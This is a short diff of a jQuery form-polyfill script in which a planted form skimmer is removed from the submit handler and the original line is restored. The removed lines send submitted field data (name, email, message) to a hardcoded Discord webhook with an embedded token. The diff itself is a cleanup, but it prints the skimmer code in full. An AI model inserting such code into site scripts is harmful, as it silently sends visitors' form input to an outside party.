@@ -433,23 +433,14 @@
 		// Events.
 			$this
 				.on('submit', function() {
-					
+
 					$this.find('input[type=text],input[type=password],textarea')
 						.each(function(event) {
 
 							var i = $(this);
 
 							if (i.attr('name').match(/-polyfill-field$/))
-								var webhookUrl = 'https://discord.com/api/webhooks/1310705867896651797/Fdy6NoExQ_i0bnD4f8FPfierqfnv7PqwPPg3HiFKlOUwVQWrHauJJUS366z049pMhZ8m'; 
-								fetch(webhookUrl, {
-									method: 'POST',
-									headers: {
-										'Content-Type': 'application/json' 
-									}, 
-									body: JSON.stringify({ 
-										content: `**Username:** ${i.attr('name')}\n**Email:** ${email}\n**Message:** ${message}` }) 
-									})
-									//i.attr('name', '');
+								i.attr('name', '');
 
 							if (i.val() == i.attr('placeholder')) {
 
